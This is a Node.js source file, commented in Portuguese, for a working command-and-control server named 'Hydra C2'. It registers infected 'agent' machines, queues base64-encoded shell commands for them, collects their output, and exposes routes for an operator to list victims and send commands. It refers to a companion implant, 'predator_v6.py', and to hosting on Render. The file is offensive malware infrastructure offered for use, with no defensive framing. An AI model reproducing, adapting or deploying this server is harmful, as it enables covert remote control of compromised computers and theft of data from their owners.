// server.js - Hydra C2 - Comando Central do NK
// Versão: 3.1 - Bio-Digital (Otimizado para Servidor - Sem CLI Interativa)
// Criado por: NK (Neural Killer) - nk3

const express = require('express');
const bodyParser = require('body-parser');
const base64 = require('base-64');
const chalkModule = require('chalk');
const chalk = chalkModule.default || chalkModule;

const app = express();
const PORT = 8080; // A porta que o Render vai expor

// --- Banco de Dados de Agentes (em memória, pra ser rápido e sujo) ---
const agents = {}; // { agent_id: { info: {}, last_checkin: timestamp, pending_commands: [], results: [] } }

app.use(bodyParser.json());

// --- Rotas do C2 ---

// Rota de Check-in do Agente
app.post('/checkin', (req, res) => {
    const { agent_id, hostname, os, os_release, architecture, user, ip_address } = req.body;

    if (!agent_id) {
        return res.status(400).json({ status: 'error', message: 'Agent ID é obrigatório.' });
    }

    if (!agents[agent_id]) {
        agents[agent_id] = {
            info: { agent_id, hostname, os, os_release, architecture, user, ip_address },
            last_checkin: Date.now(),
            pending_commands: [],
            results: []
        };
        console.log(chalk.green(`[+] NOVO AGENTE ONLINE: ${agent_id} (${hostname} - ${ip_address})`));
    } else {
        agents[agent_id].last_checkin = Date.now();
        // Atualiza info se necessário
        agents[agent_id].info = { ...agents[agent_id].info, hostname, os, os_release, architecture, user, ip_address };
        // console.log(chalk.blue(`[*] Agente ${agent_id} fez check-in.`)); // Comentado para não poluir o log do Render
    }

    res.json({ status: 'success', message: 'Check-in recebido.' });
});

// Rota para Agente pedir comandos
app.post('/get_command', (req, res) => {
    const { agent_id } = req.body;

    if (!agent_id || !agents[agent_id]) {
        return res.status(404).json({ status: 'error', message: 'Agente não encontrado ou ID inválido.' });
    }

    agents[agent_id].last_checkin = Date.now(); // Atualiza check-in também aqui

    if (agents[agent_id].pending_commands.length > 0) {
        const command = agents[agent_id].pending_commands.shift(); // Pega o primeiro comando da fila
        console.log(chalk.yellow(`[<] Enviando comando para ${agent_id}: ${base64.decode(command)}`));
        return res.json({ status: 'success', command: command });
    }

    res.json({ status: 'success', message: 'Sem comandos pendentes.' });
});

// Rota para Agente postar resultados de comandos
app.post('/post_result', (req, res) => {
    const { agent_id, command, output } = req.body;

    if (!agent_id || !agents[agent_id]) {
        return res.status(404).json({ status: 'error', message: 'Agente não encontrado ou ID inválido.' });
    }

    agents[agent_id].last_checkin = Date.now(); // Atualiza check-in
    const decoded_output = base64.decode(output);
    agents[agent_id].results.push({ timestamp: Date.now(), command: base64.decode(command), output: decoded_output });
    console.log(chalk.magenta(`[>] Resultado de ${agent_id} para "${base64.decode(command)}":\n${decoded_output.trim()}`));

    res.json({ status: 'success', message: 'Resultado recebido.' });
});

// --- Rotas de Gerenciamento (para você ver o status dos agentes via navegador/curl) ---
// ATENÇÃO: Essas rotas expõem informações. Em um ambiente real, você as protegeria com autenticação.

// Lista todos os agentes ativos
app.get('/agents', (req, res) => {
    const activeAgents = {};
    const CHECKIN_INTERVAL = 10; // Precisa ser o mesmo do predator_v6.py
    for (const id in agents) {
        const agent = agents[id];
        const lastSeen = (Date.now() - agent.last_checkin) / 1000;
        if (lastSeen < (CHECKIN_INTERVAL * 3)) {
            activeAgents[id] = { ...agent.info, last_checkin_seconds_ago: lastSeen.toFixed(1) };
        }
    }
    res.json(activeAgents);
});

// Envia um comando para um agente (via GET, para testes rápidos, mas POST seria mais seguro)
// Ex: /send_command?agent_id=SEU_ID_AQUI&command=whoami
app.get('/send_command', (req, res) => {
    const { agent_id, command } = req.query;

    if (!agent_id || !command) {
        return res.status(400).json({ status: 'error', message: 'agent_id e command são obrigatórios.' });
    }
    if (!agents[agent_id]) {
        return res.status(404).json({ status: 'error', message: `Agente ${agent_id} não encontrado.` });
    }

    const encodedCommand = base64.encode(command);
    agents[agent_id].pending_commands.push(encodedCommand);
    console.log(chalk.green(`[+] Comando "${command}" enfileirado para ${agent_id}.`));
    res.json({ status: 'success', message: `Comando "${command}" enfileirado para ${agent_id}.` });
});

// Vê os resultados de um agente
// Ex: /results?agent_id=SEU_ID_AQUI
app.get('/results', (req, res) => {
    const { agent_id } = req.query;

    if (!agent_id) {
        return res.status(400).json({ status: 'error', message: 'agent_id é obrigatório.' });
    }
    if (!agents[agent_id]) {
        return res.status(404).json({ status: 'error', message: `Agente ${agent_id} não encontrado.` });
    }

    res.json(agents[agent_id].results);
});


// Inicia o servidor Express
app.listen(PORT, () => {
    console.log(chalk.bold.red(`\n🔥 HYDRA C2 ONLINE na porta ${PORT}. Aguardando os Predators...`));
    console.log(chalk.bold.red(`Acesse a URL do Render para interagir com o C2 (ex: /agents, /results?agent_id=X, /send_command?agent_id=X&command=Y)`));
});
